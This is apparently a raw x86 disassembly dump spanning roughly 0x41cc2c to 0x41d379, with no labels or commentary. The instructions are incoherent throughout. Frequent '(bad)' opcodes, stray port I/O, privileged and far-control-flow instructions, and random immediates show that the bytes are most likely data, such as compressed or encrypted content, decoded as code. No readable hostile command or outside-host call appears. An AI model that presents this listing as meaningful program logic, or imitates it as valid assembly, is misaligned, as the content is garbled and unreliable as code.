  41cc2c:	lea    ebp,[edi-0x7d]
  41cc2f:	or     al,0x36
  41cc31:	cmp    bl,dh
  41cc33:	push   ebp
  41cc34:	mov    edi,DWORD PTR [edi-0x33]
  41cc37:	sbb    ch,BYTE PTR [ecx+esi*1-0x57c9ae8]
  41cc3e:	ins    BYTE PTR es:[edi],dx
  41cc3f:	sub    al,0x62
  41cc41:	addr16 sti 
  41cc43:	enter  0x9cc5,0x6a
  41cc47:	mov    edx,0xed3975f7
  41cc4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc4d:	(bad)  
  41cc4e:	push   ss
  41cc4f:	ja     0x41cbf5
  41cc51:	ret    0xc744
  41cc54:	jbe    0x41cc72
  41cc56:	sub    BYTE PTR [ebx+0x77],0x22
  41cc5a:	sub    al,dl
  41cc5c:	lahf   
  41cc5d:	adc    al,0xf6
  41cc5f:	push   cs
  41cc60:	enter  0xe425,0x73
  41cc64:	bound  eax,QWORD PTR cs:[esi+0x374db70e]
  41cc6b:	stc    
  41cc6c:	pop    eax
  41cc6d:	sub    al,0x81
  41cc6f:	mov    edi,0xf766191
  41cc74:	xor    DWORD PTR [ebx+0x66955205],0xab6f9601
  41cc7e:	repnz (bad) [ebx+0x2e]
  41cc82:	dec    esi
  41cc83:	test   al,0xb0
  41cc85:	and    DWORD PTR [ebx-0x26],eax
  41cc88:	out    dx,ax
  41cc8a:	int    0xf4
  41cc8c:	push   edx
  41cc8d:	mov    ds:0xff9381e7,eax
  41cc92:	jbe    0x41cca9
  41cc94:	rcr    DWORD PTR [ebx],1
  41cc96:	outs   dx,DWORD PTR ds:[esi]
  41cc97:	mov    ebp,0x63fce136
  41cc9c:	mov    bh,BYTE PTR [eax]
  41cc9e:	es inc edi
  41cca0:	(bad)  
  41cca1:	and    eax,0x96189576
  41cca6:	dec    edx
  41cca7:	jno    0x41cc45
  41cca9:	mov    al,ch
  41ccab:	adc    dl,0xeb
  41ccae:	loop   0x41cccd
  41ccb0:	ror    al,0x39
  41ccb3:	in     al,dx
  41ccb4:	pop    edi
  41ccb5:	out    dx,al
  41ccb6:	cli    
  41ccb7:	mov    edx,0x1f521f7
  41ccbc:	push   esp
  41ccbd:	or     BYTE PTR [ebx+0x2ce2e7b8],dh
  41ccc3:	jmp    0x9f04c3f4
  41ccc8:	mov    DWORD PTR [edi+ebp*4+0x1a],ebp
  41cccc:	das    
  41cccd:	loopne 0x41ccf8
  41cccf:	mov    bl,0x2e
  41ccd1:	loop   0x41ccc7
  41ccd3:	test   eax,0x417c5d1f
  41ccd8:	(bad)  [esi]
  41ccda:	cmp    esi,edx
  41ccdc:	jge    0x41ccc3
  41ccde:	inc    edx
  41ccdf:	sub    edx,DWORD PTR [edx+ecx*1]
  41cce2:	sbb    ebx,DWORD PTR [esi]
  41cce4:	dec    edx
  41cce5:	pop    ds
  41cce6:	mov    ds:0xd0f1ad36,al
  41cceb:	mov    bh,0xee
  41cced:	adc    bh,BYTE PTR [ebx+0x2a]
  41ccf0:	mov    edi,0x4c89e2df
  41ccf5:	push   esi
  41ccf6:	jo     0x41ccf2
  41ccf8:	cmp    esi,DWORD PTR [eax+0x51ff0c43]
  41ccfe:	sub    BYTE PTR [ecx+edx*2+0x5],0x8e
  41cd03:	push   esp
  41cd04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd05:	mov    edx,0xbc1f2716
  41cd0a:	add    eax,0x70d9b6db
  41cd0f:	mov    esi,0xaf421aa0
  41cd14:	xor    al,0xcf
  41cd16:	popf   
  41cd17:	out    dx,eax
  41cd18:	xor    edi,0x7fa71827
  41cd1e:	mov    BYTE PTR [edi+eax*4-0x4a],cl
  41cd22:	imul   eax,DWORD PTR [ebx],0x783bf174
  41cd28:	imul   DWORD PTR [ebx+0x28]
  41cd2b:	shr    DWORD PTR [edi],cl
  41cd2d:	push   edx
  41cd2e:	int3   
  41cd2f:	shl    DWORD PTR [ecx],1
  41cd31:	retf   0xb9b9
  41cd34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd35:	add    ch,BYTE PTR [ecx-0x31]
  41cd38:	lds    edx,FWORD PTR ds:[ebp+0x2a3a96f4]
  41cd3f:	jmp    0xb3728442
  41cd44:	fbstp  TBYTE PTR [ebx+0x3f]
  41cd47:	dec    esi
  41cd48:	push   cs
  41cd49:	loop   0x41cd17
  41cd4b:	popa   
  41cd4c:	daa    
  41cd4d:	lods   al,BYTE PTR ds:[esi]
  41cd4e:	dec    ebx
  41cd4f:	jg     0x41cd28
  41cd51:	ret    0xcbe8
  41cd54:	adc    esp,DWORD PTR [ebp+0x61]
  41cd57:	je     0x41cd15
  41cd59:	retf   
  41cd5a:	cli    
  41cd5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd5c:	mov    ecx,0xf9af343f
  41cd61:	out    dx,al
  41cd62:	mov    ah,0x7
  41cd64:	jo     0x41cd68
  41cd66:	dec    esi
  41cd67:	into   
  41cd68:	and    BYTE PTR [edx],dl
  41cd6a:	aam    0x7e
  41cd6c:	das    
  41cd6d:	adc    BYTE PTR [ecx+ebp*1+0x1757c764],0xf1
  41cd75:	xchg   BYTE PTR [edi+0xf],bh
  41cd78:	stc    
  41cd79:	push   ecx
  41cd7a:	cmp    al,0x92
  41cd7c:	test   BYTE PTR [edi-0x26],0x5c
  41cd80:	sbb    eax,DWORD PTR [edi+0xbe20a96]
  41cd86:	nop
  41cd87:	xchg   DWORD PTR [ebx],eax
  41cd89:	xchg   edi,eax
  41cd8a:	add    bh,BYTE PTR [esi+0x9]
  41cd8d:	xchg   edx,eax
  41cd8e:	out    dx,al
  41cd8f:	data16 ficom WORD PTR [edx+0x53b0d9a7]
  41cd96:	fild   DWORD PTR [ecx+ebp*4-0x31999e8a]
  41cd9d:	sar    BYTE PTR [edi],cl
  41cd9f:	retf   0xc55a
  41cda2:	popf   
  41cda3:	pop    esp
  41cda4:	bound  edi,QWORD PTR [eax+0x71]
  41cda7:	adc    bh,BYTE PTR [ebp+0x31]
  41cdaa:	jp     0x41ce03
  41cdac:	xchg   edx,eax
  41cdad:	aad    0x7d
  41cdaf:	cwde   
  41cdb0:	xchg   al,ah
  41cdb2:	inc    ecx
  41cdb3:	scas   al,BYTE PTR es:[edi]
  41cdb4:	inc    eax
  41cdb5:	xlat   BYTE PTR ds:[ebx]
  41cdb6:	push   ebx
  41cdb7:	imul   eax,esp,0x28
  41cdba:	sar    dl,1
  41cdbc:	jg     0x41cd8b
  41cdbe:	mov    ecx,0xe96af4c0
  41cdc3:	shl    BYTE PTR [esi],0xc5
  41cdc6:	out    dx,al
  41cdc7:	rol    DWORD PTR [esi+edi*8],1
  41cdca:	xor    BYTE PTR [ebx],bh
  41cdcc:	test   esp,ebp
  41cdce:	push   0x2301e92f
  41cdd3:	and    al,bh
  41cdd5:	push   0x8efa885b
  41cdda:	je     0x41cde6
  41cddc:	adc    eax,0x1d038ebe
  41cde1:	xchg   edx,eax
  41cde2:	into   
  41cde3:	lock ins DWORD PTR es:[edi],dx
  41cde5:	ins    DWORD PTR es:[edi],dx
  41cde6:	sub    DWORD PTR [esi],0xf1597c28
  41cdec:	out    0x79,eax
  41cdee:	int3   
  41cdef:	les    ebx,FWORD PTR [edi-0x572df99b]
  41cdf5:	jp     0x41ce5f
  41cdf7:	mov    ds:0xfe83bcc4,al
  41cdfc:	cmp    al,0xd0
  41cdfe:	in     eax,0x13
  41ce00:	aam    0x42
  41ce02:	sub    ecx,DWORD PTR ds:0x45afff8b
  41ce08:	push   0x9b2ce3ed
  41ce0d:	mov    ah,0x9d
  41ce0f:	jmp    0x98b8:0xbe1ddb34
  41ce16:	es pushf 
  41ce18:	dec    esi
  41ce19:	dec    ebx
  41ce1a:	jge    0x41ce7a
  41ce1c:	aad    0xa2
  41ce1e:	adc    eax,DWORD PTR [ecx+0x2]
  41ce21:	mov    ecx,0xd11c04f8
  41ce26:	in     al,dx
  41ce27:	clc    
  41ce28:	sahf   
  41ce29:	xor    bl,cl
  41ce2b:	out    dx,al
  41ce2c:	sbb    DWORD PTR [edi+ecx*8+0x46f46d7d],ebp
  41ce33:	je     0x41ce49
  41ce35:	mov    bl,0x6a
  41ce37:	xor    BYTE PTR [ebp+0x58],0x42
  41ce3b:	lahf   
  41ce3c:	cs out dx,al
  41ce3e:	mul    DWORD PTR [ebx+0x4f]
  41ce41:	dec    ecx
  41ce42:	jbe    0x41cdff
  41ce44:	pop    edx
  41ce45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce46:	sbb    bl,ch
  41ce48:	scas   al,BYTE PTR es:[edi]
  41ce49:	data16 in al,0xe4
  41ce4c:	sbb    eax,0x4b18fe13
  41ce51:	mov    ebp,0x65035a43
  41ce56:	inc    DWORD PTR [edx-0x3137293b]
  41ce5c:	sti    
  41ce5d:	int3   
  41ce5e:	pop    esi
  41ce5f:	int    0x1e
  41ce61:	lahf   
  41ce62:	adc    DWORD PTR [edx+0x59030ce],ebx
  41ce68:	dec    ecx
  41ce69:	ins    DWORD PTR es:[edi],dx
  41ce6a:	mov    ebp,0x8e0e4f3a
  41ce6f:	(bad)  
  41ce70:	in     eax,dx
  41ce71:	mov    ds:0xcd8c93d3,al
  41ce76:	mov    esp,0xff431f22
  41ce7b:	mov    ecx,0xb91292a4
  41ce80:	mov    ds,WORD PTR [ebx]
  41ce82:	fstp   DWORD PTR [eax+0x577baae8]
  41ce88:	ds aas 
  41ce8a:	and    BYTE PTR [edi],bh
  41ce8c:	push   ds
  41ce8d:	iret   
  41ce8e:	cmp    esp,0xffffff9a
  41ce91:	jno    0x41ce5e
  41ce93:	aad    0x64
  41ce95:	fisub  DWORD PTR [eax+0xa]
  41ce98:	ja     0x41ce74
  41ce9a:	mov    bl,0x35
  41ce9c:	ret    
  41ce9d:	push   edx
  41ce9e:	xchg   esi,eax
  41ce9f:	ins    BYTE PTR es:[edi],dx
  41cea0:	out    0x58,eax
  41cea2:	add    edi,0x6e
  41cea5:	out    dx,al
  41cea6:	fild   DWORD PTR [esi-0x22]
  41cea9:	add    ch,BYTE PTR [edi+0x4e]
  41ceac:	and    edi,edi
  41ceae:	into   
  41ceaf:	add    eax,0x8eeb96dd
  41ceb4:	cdq    
  41ceb5:	mov    dh,0x71
  41ceb7:	or     eax,0x9d22d72b
  41cebc:	mov    ebx,0xc7690053
  41cec1:	pop    ebp
  41cec2:	mov    al,ds:0x2a73a769
  41cec7:	or     DWORD PTR [esi+0x29e74021],esp
  41cecd:	fisubr DWORD PTR [ebx-0x5daaf9f9]
  41ced3:	bound  esi,QWORD PTR [eax+0x4d]
  41ced6:	cmp    bh,BYTE PTR [edi]
  41ced8:	mov    BYTE PTR es:[ebp-0x1c],ah
  41cedc:	jg     0x41ceb8
  41cede:	pop    ds
  41cedf:	outs   dx,DWORD PTR ds:[esi]
  41cee0:	pop    esi
  41cee1:	js     0x41cf5f
  41cee3:	aad    0x60
  41cee5:	shl    DWORD PTR [esi+0x71fedc0e],1
  41ceeb:	pop    edx
  41ceec:	adc    eax,0x391e1581
  41cef1:	jbe    0x41cf45
  41cef3:	jp     0x41cf4d
  41cef5:	and    bh,BYTE PTR [ebp-0x70]
  41cef8:	jg     0x41cef4
  41cefa:	mov    esi,DWORD PTR [esi-0x67]
  41cefd:	int    0x69
  41ceff:	hlt    
  41cf00:	cmp    eax,0x37836fba
  41cf05:	push   edi
  41cf06:	mov    al,BYTE PTR [ebx+0x6b]
  41cf09:	mov    ds:0x51b62acc,al
  41cf0e:	jmp    FWORD PTR [edi]
  41cf10:	out    dx,al
  41cf11:	addr16 cld 
  41cf13:	cmc    
  41cf14:	jo     0x41cee3
  41cf16:	stc    
  41cf17:	test   BYTE PTR [eax-0x35],cl
  41cf1a:	fmul   QWORD PTR [edx-0x43]
  41cf1d:	xor    ebx,edi
  41cf1f:	(bad)  
  41cf20:	xchg   DWORD PTR [edi-0x80],edx
  41cf23:	popf   
  41cf24:	fiadd  DWORD PTR [edx+eiz*2+0x4641dc68]
  41cf2b:	xchg   ecx,eax
  41cf2c:	and    eax,0xcae57cb5
  41cf31:	cmp    eax,0x820accf5
  41cf36:	pushf  
  41cf37:	add    BYTE PTR [ebp+0x6075669b],bl
  41cf3d:	mov    al,BYTE PTR [edx+0x7f]
  41cf40:	or     ah,BYTE PTR [edi+0x5e]
  41cf43:	into   
  41cf44:	push   esi
  41cf45:	push   edx
  41cf46:	or     DWORD PTR [esi-0x40385dd3],edi
  41cf4c:	enter  0x9b76,0xb0
  41cf50:	inc    ebp
  41cf51:	(bad)  
  41cf52:	sub    al,BYTE PTR [edx-0x77]
  41cf55:	sbb    dl,BYTE PTR [edx+0x49320773]
  41cf5b:	lock push esi
  41cf5d:	mov    ah,0xbc
  41cf5f:	jnp    0x41cfa6
  41cf61:	dec    eax
  41cf62:	cs mov esp,0x6af5482f
  41cf68:	popfw  
  41cf6a:	sbb    ecx,esi
  41cf6c:	(bad)  
  41cf6d:	jg     0x41cf1c
  41cf6f:	ins    BYTE PTR es:[edi],dx
  41cf70:	ss pop eax
  41cf72:	and    eax,0x55a13c66
  41cf77:	sub    ah,BYTE PTR [edi-0x17]
  41cf7a:	mov    al,ds:0x2b2d5ff9
  41cf7f:	push   ebx
  41cf80:	inc    ebp
  41cf81:	xor    dl,ch
  41cf83:	xchg   edi,eax
  41cf84:	push   0xd282b4a4
  41cf89:	les    esi,FWORD PTR [edx+0x61]
  41cf8c:	mov    dh,0x59
  41cf8e:	sbb    DWORD PTR [edx+0x7549a84c],ecx
  41cf94:	mov    ds:0xc56e5454,al
  41cf99:	or     DWORD PTR [edi-0x8],0x44
  41cf9d:	xchg   DWORD PTR [ebx+ebp*8],edi
  41cfa0:	push   0x11
  41cfa2:	ret    
  41cfa3:	jl     0x41cf45
  41cfa5:	push   esp
  41cfa6:	(bad)  
  41cfa7:	cmp    ebx,DWORD PTR [ecx]
  41cfa9:	scas   al,BYTE PTR es:[edi]
  41cfaa:	(bad)  
  41cfab:	repz mov dh,0xb4
  41cfae:	loop   0x41d010
  41cfb0:	inc    eax
  41cfb1:	cmc    
  41cfb2:	push   edx
  41cfb3:	(bad)  
  41cfb5:	sbb    al,0x9e
  41cfb7:	pop    edi
  41cfb8:	lods   eax,DWORD PTR ds:[esi]
  41cfb9:	cmp    edi,DWORD PTR [edx]
  41cfbb:	into   
  41cfbc:	test   bh,bl
  41cfbe:	inc    esp
  41cfbf:	test   DWORD PTR ds:0x7b07e80c,esp
  41cfc5:	cmp    esp,ebp
  41cfc7:	stos   BYTE PTR es:[edi],al
  41cfc8:	fisttp WORD PTR [edx+0x4e]
  41cfcb:	mov    al,0x34
  41cfcd:	pop    ss
  41cfce:	push   0x76841695
  41cfd3:	out    0xc5,eax
  41cfd5:	push   edx
  41cfd6:	cmp    DWORD PTR [ebx+0x21b383c4],ecx
  41cfdc:	jle    0x41cf9f
  41cfde:	add    edx,DWORD PTR [esi-0x39]
  41cfe1:	dec    ecx
  41cfe2:	push   ebp
  41cfe3:	bound  ebp,QWORD PTR [eax]
  41cfe5:	pop    ss
  41cfe6:	lahf   
  41cfe7:	icebp  
  41cfe8:	lahf   
  41cfe9:	ja     0x41d047
  41cfeb:	mov    dh,0x79
  41cfed:	pop    edi
  41cfee:	in     al,dx
  41cfef:	inc    edi
  41cff0:	scas   eax,DWORD PTR es:[edi]
  41cff1:	jp     0x41d041
  41cff3:	or     eax,ebp
  41cff5:	jo     0x41d023
  41cff7:	or     esp,DWORD PTR [esi-0x38d44db9]
  41cffd:	xchg   ebx,eax
  41cffe:	mov    ss,WORD PTR [ecx+0xd]
  41d001:	and    BYTE PTR [edi-0xab706d7],0x60
  41d008:	mov    bl,0x65
  41d00a:	(bad)  
  41d00b:	mov    bh,0x3b
  41d00d:	cmc    
  41d00e:	or     dh,al
  41d010:	imul   ecx,esp,0x898bafca
  41d016:	ins    BYTE PTR es:[edi],dx
  41d017:	cwde   
  41d018:	xchg   esi,eax
  41d019:	dec    eax
  41d01a:	sub    eax,0xccc77ff8
  41d01f:	ror    ebx,0x68
  41d022:	mov    bh,0x29
  41d024:	mov    edx,0xed2e953e
  41d029:	xor    DWORD PTR [ebp-0x55c615d2],esp
  41d02f:	imul   BYTE PTR [ecx]
  41d031:	xor    DWORD PTR [ebx],esi
  41d033:	shl    BYTE PTR [ecx],1
  41d035:	push   esi
  41d036:	push   esi
  41d037:	lahf   
  41d038:	bound  edi,QWORD PTR [edx+0x6bb59273]
  41d03e:	jns    0x41d032
  41d040:	int    0xe5
  41d042:	and    eax,0x3048e03b
  41d047:	xchg   ebx,eax
  41d049:	push   ecx
  41d04a:	pop    ebp
  41d04b:	nop
  41d04c:	hlt    
  41d04d:	fcom   DWORD PTR [esp+ebp*8+0xa8d2875]
  41d054:	ret    0xdfe6
  41d057:	sbb    dh,bl
  41d059:	mov    edi,0xb383605e
  41d05e:	dec    eax
  41d05f:	sbb    bl,ah
  41d061:	dec    esp
  41d062:	sub    eax,0xd3b64ef8
  41d067:	stos   DWORD PTR es:[edi],eax
  41d068:	iret   
  41d069:	mov    ebp,0xa196c6af
  41d06e:	push   ebp
  41d06f:	pop    ecx
  41d070:	inc    edi
  41d071:	pop    ecx
  41d072:	dec    eax
  41d073:	xchg   dx,ax
  41d075:	adc    eax,0xc77a2588
  41d07a:	rol    edx,1
  41d07c:	add    DWORD PTR [esi-0x6615c2e5],edi
  41d082:	cmp    esi,esi
  41d084:	sub    ch,BYTE PTR [edx+edi*1]
  41d087:	stos   DWORD PTR es:[edi],eax
  41d088:	xlat   BYTE PTR ds:[ebx]
  41d089:	fisttp DWORD PTR [ebx+0x1e]
  41d08c:	and    eax,0xda2011d1
  41d091:	sbb    al,0x72
  41d093:	dec    edx
  41d094:	and    DWORD PTR [ecx-0x6],ebp
  41d097:	push   esi
  41d098:	cmp    dl,ah
  41d09a:	xor    ah,BYTE PTR [edx]
  41d09c:	sub    DWORD PTR [edx],ebx
  41d09e:	sbb    eax,DWORD PTR [ebp-0x6eaa06c]
  41d0a4:	aaa    
  41d0a5:	xchg   esi,eax
  41d0a6:	cmp    cl,BYTE PTR [ebp-0x6bf85324]
  41d0ac:	retf   
  41d0ad:	out    0x24,al
  41d0af:	or     edx,DWORD PTR [eax]
  41d0b1:	pop    esp
  41d0b2:	push   ds
  41d0b3:	fsubr  st,st(5)
  41d0b5:	rol    edx,1
  41d0b7:	and    edx,DWORD PTR [esi-0x46]
  41d0ba:	data16 add ah,BYTE PTR [eax-0x19]
  41d0be:	xchg   BYTE PTR [edi-0x4b],cl
  41d0c1:	inc    edi
  41d0c2:	mov    ebp,0x2eaf17c9
  41d0c7:	repnz das 
  41d0c9:	ds out 0xc7,eax
  41d0cc:	(bad)  
  41d0cd:	js     0x41d100
  41d0cf:	mov    esp,0x177ceffc
  41d0d4:	leave  
  41d0d5:	rcl    DWORD PTR [ecx+0x12220386],0xc0
  41d0dc:	sub    dh,BYTE PTR [ecx+eax*4-0x5]
  41d0e0:	ins    BYTE PTR es:[edi],dx
  41d0e1:	mov    ch,0x88
  41d0e3:	jns    0x41d0d1
  41d0e5:	imul   edi,DWORD PTR [eax],0xffffff9c
  41d0e8:	xor    esi,DWORD PTR [ecx+0x6c]
  41d0eb:	in     eax,0xe0
  41d0ed:	ret    0x9758
  41d0f0:	mov    ecx,0x2f71e4
  41d0f5:	repz loop 0x41d12b
  41d0f8:	push   ecx
  41d0f9:	outs   dx,BYTE PTR ds:[esi]
  41d0fa:	cmp    esp,edx
  41d0fc:	mov    eax,0x7bccb322
  41d101:	mov    dl,0xb6
  41d103:	jne    0x41d0d2
  41d105:	pop    ebp
  41d106:	mov    eax,ds:0xf7cd251a
  41d10b:	dec    ebx
  41d10c:	(bad)
  41d10f:	pop    ds
  41d110:	aaa    
  41d111:	retf   0xcdbd
  41d114:	test   al,0xf7
  41d116:	inc    eax
  41d117:	pop    ds
  41d118:	push   ss
  41d119:	out    0xb2,eax
  41d11b:	add    ebx,DWORD PTR [ebx]
  41d11d:	mov    ah,0x22
  41d11f:	(bad)  
  41d120:	jge    0x41d15c
  41d122:	inc    eax
  41d123:	mov    edi,0x3ee77caa
  41d128:	add    eax,DWORD PTR [edx-0x769c8ffb]
  41d12e:	fs push es
  41d130:	(bad)  
  41d131:	adc    cl,al
  41d133:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d134:	fistp  DWORD PTR [ebx]
  41d136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d137:	fnstenv [edi-0x15]
  41d13a:	scas   eax,DWORD PTR es:[edi]
  41d13b:	lock mov BYTE PTR [ecx-0x3a],0x3f
  41d140:	jle    0x41d142
  41d142:	sbb    esi,DWORD PTR [esi+eax*8]
  41d145:	adc    eax,0x51c57e71
  41d14a:	inc    edx
  41d14b:	push   es
  41d14c:	cmp    al,BYTE PTR [edi+0x6cf423f5]
  41d152:	jnp    0x41d167
  41d154:	iret   
  41d155:	and    eax,0x476ce278
  41d15a:	test   BYTE PTR [edx],bh
  41d15c:	jecxz  0x41d195
  41d15e:	(bad)  
  41d15f:	outs   dx,BYTE PTR ds:[esi]
  41d160:	or     bl,BYTE PTR [esp+edi*1-0x17f955cf]
  41d167:	xor    eax,0x51fc9c10
  41d16c:	fild   WORD PTR [ebp-0xd459d1e]
  41d172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d173:	jae    0x41d147
  41d175:	std    
  41d176:	outs   dx,DWORD PTR ds:[esi]
  41d177:	dec    edx
  41d178:	fnstsw WORD PTR [eax]
  41d17a:	loopne 0x41d1a5
  41d17c:	cmp    al,BYTE PTR [ebx+0x476b7282]
  41d182:	jno    0x41d1d4
  41d184:	mov    bh,0x40
  41d186:	add    bh,BYTE PTR [eax+eax*8+0x38]
  41d18a:	lods   al,BYTE PTR ds:[esi]
  41d18b:	sbb    ebp,ebx
  41d18d:	dec    ebp
  41d18e:	in     al,dx
  41d18f:	mov    ebp,0xca9bac4b
  41d194:	dec    edx
  41d195:	jnp    0x41d127
  41d197:	dec    ebp
  41d198:	sub    edx,DWORD PTR [ecx]
  41d19a:	mov    ds:0xde5fc7d0,al
  41d19f:	iret   
  41d1a0:	retf   0x5e63
  41d1a3:	repnz xchg esi,eax
  41d1a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1a6:	sti    
  41d1a7:	daa    
  41d1a8:	in     eax,dx
  41d1a9:	dec    eax
  41d1aa:	xchg   ebp,eax
  41d1ab:	push   ecx
  41d1ac:	add    ebp,0xb03a90a6
  41d1b2:	pushf  
  41d1b3:	jg     0x41d1d6
  41d1b5:	add    eax,0x382d1449
  41d1ba:	push   ds
  41d1bb:	xchg   esi,eax
  41d1bc:	pop    ebx
  41d1bd:	hlt    
  41d1be:	inc    edx
  41d1bf:	out    dx,al
  41d1c0:	push   cs
  41d1c1:	jne    0x41d1a5
  41d1c3:	or     dl,dl
  41d1c5:	(bad)  
  41d1c6:	mov    al,ds:0x72e3caa6
  41d1cb:	push   0xea88eb55
  41d1d0:	mov    al,ds:0x4241f050
  41d1d5:	sbb    bh,BYTE PTR [ecx+eax*8+0x1a]
  41d1d9:	mul    BYTE PTR ds:0xeadf7b82
  41d1df:	xor    dl,BYTE PTR [ebx]
  41d1e1:	cmp    DWORD PTR [eax],esi
  41d1e3:	call   0xbca750ab
  41d1e8:	adc    BYTE PTR [edx-0x3c],bl
  41d1eb:	xchg   BYTE PTR [eax],ch
  41d1ed:	in     eax,dx
  41d1ee:	cmp    BYTE PTR [esi-0x7c],dl
  41d1f1:	jge    0x41d1bd
  41d1f3:	push   0x6246884c
  41d1f8:	sbb    al,BYTE PTR [esi+0x29287956]
  41d1fe:	ret    
  41d1ff:	mov    eax,fs
  41d201:	inc    edx
  41d202:	pushf  
  41d203:	jl     0x41d1d8
  41d205:	mov    bh,0x1b
  41d207:	stc    
  41d208:	bound  edx,QWORD PTR [edi+0x13]
  41d20b:	mov    ds:0x765bc4e2,al
  41d210:	sub    cl,bh
  41d212:	xor    al,0x2b
  41d214:	shl    BYTE PTR [ebx],1
  41d216:	popf   
  41d217:	sub    al,0x83
  41d219:	fbld   TBYTE PTR [eax-0x4a63dab]
  41d21f:	or     ebx,ecx
  41d221:	ja     0x41d1b8
  41d223:	nop
  41d224:	sbb    al,BYTE PTR [ebp+0x71]
  41d227:	fcomp  QWORD PTR [ebx+edi*8-0x55d4b46f]
  41d22e:	jo     0x41d200
  41d230:	mov    ds:0x93b91334,eax
  41d235:	retf   
  41d236:	lds    edi,FWORD PTR [edx]
  41d238:	adc    DWORD PTR [edx],ecx
  41d23a:	and    dl,BYTE PTR [ebx+0x3a]
  41d23d:	add    dl,BYTE PTR [edx+0x143626e4]
  41d243:	aad    0xdf
  41d245:	add    BYTE PTR ds:0x614676b1,ah
  41d24b:	jge    0x41d21a
  41d24d:	scas   eax,DWORD PTR es:[edi]
  41d24e:	sub    edi,DWORD PTR [ecx]
  41d250:	ja     0x41d25c
  41d252:	inc    ebx
  41d253:	ret    0xd520
  41d256:	and    eax,0x2aa29b33
  41d25b:	xchg   DWORD PTR [esi+0x36],ebp
  41d25e:	dec    ecx
  41d25f:	jbe    0x41d22c
  41d261:	pop    eax
  41d262:	jae    0x41d275
  41d264:	adc    BYTE PTR [esi-0x7f],0xa1
  41d268:	xchg   ecx,eax
  41d269:	test   DWORD PTR [edx+0x46dff636],ebp
  41d26f:	sub    ebx,DWORD PTR [edi+0xf]
  41d272:	lahf   
  41d273:	shl    BYTE PTR [ebx],cl
  41d275:	int3   
  41d276:	xor    al,0xed
  41d278:	mov    ss,WORD PTR [ecx+0x1e]
  41d27b:	mov    esp,0xe8285ae1
  41d280:	fdiv   QWORD PTR [esi]
  41d282:	jmp    0x3ebab487
  41d287:	pop    edi
  41d288:	cs mov bh,0xe3
  41d28b:	mov    ebx,DWORD PTR [ebx-0x3]
  41d28e:	xor    esp,DWORD PTR [edx]
  41d290:	(bad)  
  41d291:	xor    al,0xf4
  41d293:	data16 fwait
  41d295:	scas   al,BYTE PTR es:[edi]
  41d296:	and    dh,cl
  41d298:	sub    al,0xf2
  41d29a:	jg     0x41d235
  41d29c:	dec    esi
  41d29d:	ret    
  41d29e:	addr16 retf 
  41d2a0:	and    bh,BYTE PTR [edx+0x24]
  41d2a3:	fimul  DWORD PTR [ecx]
  41d2a5:	mov    eax,DWORD PTR gs:[esi-0x68a2e317]
  41d2ac:	rcr    DWORD PTR [ecx-0x76],0xf6
  41d2b0:	inc    ebx
  41d2b1:	adc    bh,BYTE PTR [ebx-0x4bacdd92]
  41d2b7:	xchg   edx,eax
  41d2b8:	retf   
  41d2b9:	mov    ebx,0x2d1269a
  41d2be:	inc    esp
  41d2bf:	cdq    
  41d2c0:	jg     0x41d252
  41d2c2:	add    edx,eax
  41d2c4:	xchg   BYTE PTR [ebp-0x6ab3d8ee],bh
  41d2ca:	sahf   
  41d2cb:	les    esp,FWORD PTR [eax-0x306ea81]
  41d2d1:	ins    BYTE PTR es:[edi],dx
  41d2d2:	shl    DWORD PTR [edi+0x59624711],cl
  41d2d8:	repz mov ch,0x9
  41d2db:	mov    si,0x97c
  41d2df:	into   
  41d2e0:	dec    ebp
  41d2e1:	mov    esp,0x169804a3
  41d2e6:	cli    
  41d2e7:	dec    eax
  41d2e8:	mov    ecx,0x7802f155
  41d2ed:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41d2ef:	sbb    DWORD PTR [eax-0x2579f0fc],ecx
  41d2f5:	fs push esp
  41d2f7:	xchg   edi,eax
  41d2f8:	dec    edx
  41d2f9:	cmc    
  41d2fa:	retf   
  41d2fb:	sbb    BYTE PTR [ebp+edx*1-0x4d],bh
  41d2ff:	jb     0x41d35d
  41d301:	retf   0xddf2
  41d304:	int3   
  41d305:	outs   dx,DWORD PTR ds:[esi]
  41d306:	stos   BYTE PTR es:[edi],al
  41d307:	rcr    BYTE PTR [ecx-0x440354d8],1
  41d30d:	in     al,dx
  41d30e:	and    BYTE PTR [edx],dl
  41d310:	pushf  
  41d311:	retf   
  41d312:	xchg   ebp,eax
  41d313:	and    cl,BYTE PTR [ecx+ebp*2]
  41d316:	lods   eax,DWORD PTR ds:[esi]
  41d317:	dec    ebp
  41d318:	sti    
  41d319:	inc    esp
  41d31a:	jns    0x41d2d9
  41d31c:	popf   
  41d31d:	test   BYTE PTR [edi-0x65],bl
  41d320:	popa   
  41d321:	imul   edi,DWORD PTR [esi-0x703b9a8d],0x6c0b54a3
  41d32b:	push   eax
  41d32c:	pop    edi
  41d32d:	pop    ds
  41d32e:	mov    ebx,0x9cd2a292
  41d333:	cli    
  41d334:	sub    esi,DWORD PTR [esi+0x51]
  41d337:	loopne 0x41d2ca
  41d339:	neg    DWORD PTR [ebp-0x339b325a]
  41d33f:	mov    edi,0x95e934eb
  41d344:	out    dx,al
  41d345:	dec    ebx
  41d346:	sbb    BYTE PTR [ebx+0x79a72915],bl
  41d34c:	jns    0x41d2e6
  41d34e:	jge    0x41d375
  41d350:	or     eax,0xd9330d07
  41d355:	sub    esp,DWORD PTR [ecx-0x67e8b85a]
  41d35b:	sub    al,0x93
  41d35d:	dec    ebx
  41d35e:	out    0x1f,al
  41d360:	pop    esi
  41d361:	lods   al,BYTE PTR ds:[esi]
  41d362:	push   ebp
  41d363:	mov    ebp,0xb19d724b
  41d368:	loopne 0x41d36d
  41d36a:	jns    0x41d3ad
  41d36c:	fldln2 
  41d36e:	push   edx
  41d36f:	pop    esp
  41d370:	or     DWORD PTR [ecx+eax*1-0x54],edx
  41d374:	xor    DWORD PTR [eax+0x47],esp
  41d377:	inc    edx
  41d378:	stc    
  41d379:	add    dh,0x4d
